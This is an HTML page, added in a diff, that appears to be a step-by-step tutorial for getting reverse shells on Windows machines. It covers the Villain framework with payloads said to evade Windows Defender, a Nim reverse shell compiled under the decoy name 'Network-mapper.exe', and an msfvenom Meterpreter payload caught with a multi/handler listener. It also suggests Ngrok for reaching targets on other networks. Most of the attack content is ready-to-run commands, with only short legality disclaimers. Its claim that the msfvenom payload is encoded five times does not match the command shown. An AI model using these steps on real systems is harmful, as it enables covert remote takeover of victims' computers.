@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Villain Framework Setup Guide</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f5f5;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+        }
+        h1, h2, h3 {
+            color: #444;
+        }
+        code {
+            background-color: #e0e0e0;
+            padding: 4px;
+            border-radius: 3px;
+            color: #FF5EA4;
+        }
+        pre {
+            background-color: #e0e0e0;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>Villain Framework Setup Guide</h1>
+    
+    <h2>Step-by-Step Guide</h2>
+    
+    <h3>Set Up Virtual Machines</h3>
+    <ul>
+        <li>Create and configure Kali Linux as the attacker machine.</li>
+        <li>Set up a Windows 10/11 VM as the target machine.</li>
+    </ul>
+    
+    <h3>Download and Install Villain Framework</h3>
+    <ol>
+        <li>On your Kali Linux machine, clone the Villain repository:</li>
+        <pre><code>git clone https://github.com/keralahacker/Villain.git
+cd Villain/
+pip install -r requirements.txt</code></pre>
+        <p><em>Villain framework is pre-configured with necessary changes that can obfuscate payload for Windows Defender.</em></p>
+        <li>Run Villain Framework as root:</li>
+        <pre><code>python Villain.py</code></pre>
+    </ol>
+    
+    <h3>Generate the Windows Payload</h3>
+    <ol>
+        <li>Generate the payload with the command:</li>
+        <pre><code>generate os=windows lhost=eth0</code></pre>
+        <li>Ensure the correct network interface by using <code>ifconfig</code> or <code>ip a</code> to verify.</li>
+    </ol>
+    
+    <h3>Execute the Payload on the Windows Machine</h3>
+    <ol>
+        <li>Copy the generated payload.</li>
+        <li>Open PowerShell on the Windows VM, paste the payload, and execute it.</li>
+    </ol>
+    
+    <h3>Establish a Connection to the Compromised Machine</h3>
+    <ol>
+        <li>In the Villain terminal, list compromised machines:</li>
+        <pre><code>cmd - sessions</code></pre>
+        <li>Identify the Windows machine’s ID.</li>
+    </ol>
+    
+    <h3>Access the Compromised Machine’s Shell</h3>
+    <ol>
+        <li>To open a shell on the compromised machine, run:</li>
+        <pre><code>shell &lt;id number&gt;</code></pre>
+        <li>Replace <code>&lt;id number&gt;</code> with the actual machine ID from the <code>sessions</code> command.</li>
+    </ol>
+    
+    <h3>Post-Exploitation</h3>
+    <p>You now have full control over the Windows machine for post-exploitation tasks such as system information gathering, file manipulation, or further network exploitation.</p>
+    
+    <h3>Important Notes:</h3>
+    <ul>
+        <li>This method bypasses modern antivirus protections and allows for stealthy access.</li>
+        <li>Ensure these steps are used ethically and legally for penetration testing and research purposes only.</li>
+    </ul>
+    
+    <h2>Installing Nim in Ubuntu</h2>
+    <p>To install Nim on your Ubuntu machine, run the following simple command:</p>
+    <pre><code>sudo apt install nim && sudo apt install -y mingw-w64</code></pre>
+    <p>This command installs Nim along with MinGW-w64, which allows you to cross-compile Nim programs for Windows on an Ubuntu machine.</p>
+    
+    <h2>Full Command Breakdown</h2>
+    <pre><code>nim c -d:mingw --app:gui --opt:speed -o:Network-mapper.exe rev_shell.nim</code></pre>
+    <p>This command compiles a Nim script into an optimized Windows executable using cross-compilation with MinGW. Here’s a detailed breakdown of each part:</p>
+    <ul>
+        <li><code>nim</code>: Calls the Nim compiler.</li>
+        <li><code>c</code>: Directs Nim to generate C code from the Nim script and then compile it.</li>
+        <li><code>-d:mingw</code>: Uses the mingw directive for cross-compilation, which is needed to create Windows executables from Linux.</li>
+        <li><code>--app:gui</code>: Configures the application to run as a GUI app rather than a console app, meaning it won't open a console window when executed.</li>
+        <li><code>--opt:speed</code>: Optimizes the output binary for speed, enhancing performance.</li>
+        <li><code>-o:Network-mapper.exe</code>: Specifies the output file name for the compiled executable. Here, it will produce <code>Network-mapper.exe</code>.</li>
+        <li><code>rev_shell.nim</code>: The source file to be compiled. This should contain the code for the reverse shell functionality.</li>
+    </ul>
+
+    <h2>Full Command Breakdown for msfvenom Payload</h2>
+    <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your_ip&gt; LPORT=&lt;your_port&gt; -f exe -o payload.exe</code></pre>
+    <p>This command creates an encrypted Windows executable payload (<code>payload.exe</code>) that, when executed on a target machine, will establish a reverse shell connection to the attacker’s IP and port. The payload is encoded five times to increase the chance of bypassing security mechanisms on the target system.</p>
+    <ul>
+        <li><code>msfvenom</code>: This is the command-line tool used to generate and encode payloads.</li>
+        <li><code>-p windows/meterpreter/reverse_tcp</code>: The <code>-p</code> option specifies the payload to generate. In this case, it’s a reverse TCP Meterpreter payload for Windows:
+            <ul>
+                <li><code>windows/</code>: Indicates a Windows-specific payload.</li>
+                <li><code>meterpreter</code>: A Metasploit payload that provides a command-and-control shell with advanced capabilities, such as file uploads/downloads, keylogging, and screenshot capture.</li>
+                <li><code>reverse_tcp</code>: Sets up a reverse shell where the target system connects back to the attacker's IP and port, allowing command execution on the remote machine.</li>
+            </ul>
+        </li>
+        <li><code>LHOST=&lt;your_ip&gt;</code>: The <code>LHOST</code> option specifies the local IP address of the attacker's machine that the payload should connect to. Replace <code>&lt;your_ip&gt;</code> with the IP address of the attacker's system.</li>
+        <li><code>LPORT=&lt;your_port&gt;</code>: The <code>LPORT</code> option specifies the local port on the attacker’s machine that the reverse shell will connect to. Replace <code>&lt;your_port&gt;</code> with a port number that is open and can receive connections.</li>
+        <li><code>-f exe</code>: The <code>-f</code> option specifies the output format. Here, <code>exe</code> indicates that the payload will be saved as a Windows executable file.</li>
+        <li><code>-o payload.exe</code>: The <code>-o</code> option specifies the output file’s name. In this example, <code>payload.exe</code> will be the generated file containing the reverse shell payload.</li>
+    </ul>
+
+    <h2>Steps to Get the Reverse Shell</h2>
+    <h3>1. Start the Metasploit Framework</h3>
+    <p>Open your terminal and start Metasploit:</p>
+    <pre><code>msfconsole</code></pre>
+    
+    <h3>2. Set Up the Multi-Handler</h3>
+    <p>A multi-handler is used to catch the reverse shell connection. Run the following commands in Metasploit:</p>
+    <pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST eth0
+set LPORT 8089
+exploit</code></pre>
+    <ul>
+        <li><code>use exploit/multi/handler</code>: This module listens for connections from payloads.</li>
+        <li><code>set payload windows/meterpreter/reverse_tcp</code>: Matches the payload type you used in msfvenom.</li>
+        <li><code>set LHOST eth0</code>: Matches the network interface you specified as LHOST in the payload.</li>
+        <li><code>set LPORT 8089</code>: Matches the port used in the payload.</li>
+        <li><code>exploit</code>: Starts the listener to catch the reverse shell.</li>
+    </ul>
+    
+    <h3>3. Transfer the Payload to the Target System</h3>
+    <p>Transfer the <code>payload.exe</code> file to the target Windows system. This can be done via:</p>
+    <ul>
+        <li>USB</li>
+        <li>File-sharing services</li>
+        <li>Other methods</li>
+    </ul>
+    
+    <h3>4. Execute the Payload</h3>
+    <p>Run the <code>payload.exe</code> on the target Windows machine. For example:</p>
+    <ul>
+        <li>Double-click it.</li>
+        <li>Use a scheduled task.</li>
+        <li>Exploit some vulnerability to execute the payload.</li>
+    </ul>
+    
+    <h3>5. Catch the Reverse Shell</h3>
+    <p>Once the payload is executed, the Metasploit handler will catch the reverse connection. You’ll see a Meterpreter session open in your Metasploit console:</p>
+    <pre><code>meterpreter &gt;</code></pre>
+    <p>You now have a Meterpreter shell on the target system.</p>
+    
+    <h2>Important Notes</h2>
+    <ul>
+        <li><strong>Permissions</strong>: Ensure you have the proper permissions to test reverse shells. Unauthorized access is illegal.</li>
+        <li><strong>Network Configuration</strong>: If the target and Kali are not on the same network, you’ll need to set up port forwarding or use a service like Ngrok to expose your LHOST over the internet.</li>
+    </ul>
+</body>
+</html>
